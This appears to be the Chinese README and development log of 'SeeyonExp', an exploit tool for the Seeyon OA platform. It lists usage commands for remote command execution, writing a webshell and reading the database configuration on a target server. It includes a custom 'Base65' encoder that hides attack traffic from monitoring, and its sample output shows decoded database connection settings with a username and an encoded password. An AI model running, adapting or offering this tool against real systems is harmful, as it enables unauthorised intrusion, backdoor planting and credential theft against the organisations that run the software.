# SeeyonExp

### 0x00 开发日志

2021-11-14 Base65 python加密解密算法

```python

import base64 

# 字符串加密
# 先进行base64加密，遍历字符串，按照ASCII表向右偏移一位，然后进行16进制加密
def B65encode(plainText):
    plainTextB64 = base64.b64encode(plainText)
    s = ''
    for i in plainTextB64:
        j = ord(i) # str > int
        s += chr(j + 1).encode('hex') # str > hex
    return s

B65str = B65encode("ctpDataSource.minCount=50")
print(B65str)

# 字符串解密
# 先进行16进制解密，然后ASCII表中字母对应的数值进行减一即可（向左偏移一位），最后进行base64解码
def B65decode(encodeText):    
    eText = encodeText.decode('hex')
    s = ''
    for i in eText:
        j = ord(i) - 1
        s += chr(j)
    return base64.b64decode(s)

encodeText = "5a345378534847315a574f7765594b6b5b5436756258364563345776654531324e423e3e"
B65str = B65decode(encodeText)
print(B65str)
```

例如：

`E:\SeeyonA6V8\A6\ApacheJetspeed\webapps\seeyon\2159169472de48d8840f0b5aed2bb484.txt`

```python

>>> B65str = B65decode("5a345378534847315a574f7765594b6b5b5436756258364563345776654531324e42717566594f796344366a5a584f7365594276644847316245314c5b484a7662486d6a5b594b765a59536d53486d696348576b65453277646e647662486d6a5b594b765a59536d4d6e53715a58796d5a3452765632474e5633577a656e577a53486d696348576b6542716b654943465a59536956333a32646e4f6d4d6f577b5b594b765a58326d51594f69446f6577646e756e63483a344d6e53715a58796d5a34523a5632474e5633577a656e577a446e4f3164465369654847556334577a5a3356765b494b71656e577a5233796964344f505a58326d51584f776354367562584f7a63344f775b6f5276643447746433577a656e577a4d6e716c5a6e4e765632474e5633577a656e577a53494b71656e577a446e4f3164465369654847556334314e7b4e38534847315a584b69643357505a58326d51594f6d5b596d77636b75755a596955654847315b58326d636f537b51554238563357745b584f315558573162483a6c51584f32646f4f776468717566594f79634436785a5953705152716b654943465a59536956333a32646e4f6d4d6e326966464f776558363151554a784e45423e")
>>> print(B65str)
ctpDataSource.minCount=50
mysql.backup.path=
db.hibernateDialect=org.hibernate.dialect.SQLServerDialect
ctpDataSource.username=sa
workflow.dialect=SQLServer
ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver
ctpDataSource.password=/1.0/YmVuam9BMjM0
ctpDataSource.url=jdbc:sqlserver://192.168.1.101:1433;DatabaseName=seeyon;maxStatements=0;SelectMethod=cursor
mysql.path=
ctpDataSource.maxCount=2000
>>>
```

2021-11-14 增加 maven打包时，程序入口方法；防止将用户id 打包进jar包造成信息泄露

使用自定义方法修改 例如：`Built-By: Apache Maven`

```xml

    <build>
        <finalName>${project.artifactId}</finalName>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <archive>
                        <manifest>
                            <!--  程序入口-->
                            <mainClass>ExpMain</mainClass>
                            <addClasspath>true</addClasspath>
                            <addDefaultImplementationEntries>false</addDefaultImplementationEntries>
                        </manifest>
<!--                        Hiding manifest entries with maven：Built-By: <my username>-->
<!--                        https://stackoverflow.com/questions/25098307/hiding-manifest-entries-with-maven-->
                        <manifestEntries>
                            <Built-By>Apache Maven</Built-By>
                        </manifestEntries>
                    </archive>
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>
                </configuration>
            </plugin>
        </plugins>
    </build>
```

2021-11-14 fix 读取数据库回显未删除生成的txt代码错误

`/src/main/java/DataConf.java`

```java

httpClient.doDel(getUrl,expDel);
change to
httpClient.doDel(realUrl,expDel);
```

2021-11-14 修改source警告，默认1.5

`/src/main/java/VersionRecognition.java`

```java

List<String> versionList1 = new ArrayList<>();
change to
List<String> versionList1 = new ArrayList<String>();
```


2021-3-13 V0.9 增加多个受影响版本，修复HTTPS无法指定端口bug

2021-2-2 V0.8 新增影响版本v6.1

2021-1-10 V0.7 增加识别版本后无损检测漏洞功能，有那么点漏扫的意思

2020-11-11 V0.6 增加数据库配置文件读取功能

2020-11-10 V0.5 增加回显流量加密功能，Base64与ascii结合，Base65

2020-11-2 V0.4 解决命令执行for循环无法执行for之后Java代码的bug，分号的神奇作用

2020-10-30 V0.3 增加文件上传功能，Base64不编码写入不了，黑名单校验

2020-10-22 V0.2 命令可以在windows与Linux下执行，并支持https

2020-10-20 V0.1 根据POC写出初步利用，可以执行命令，但是仅在windows与http下

### 0x01 使用方法

无损检验是否存在漏洞：java -jar seeyon.jar scan http/https://xxxx.com:port/seeyon 

执行命令：java -jar seeyon.jar http/https://xxxx.com:port/seeyon cmd 

写入shell：java -jar seeyon.jar http/https://xxxx.com:port/seeyon shell srcFile desFile 

读取数据库配置文件：java -jar seeyon.jar http/https://xxxx.com:port/seeyon dataConf 

流量解码：java -jar seeyon.jar decode ciphertext 

流量编码：java -jar seeyon.jar encode Plaintext

使用参考：https://mp.weixin.qq.com/s/NKksirrM5Zg5BGCu4fY8LQ
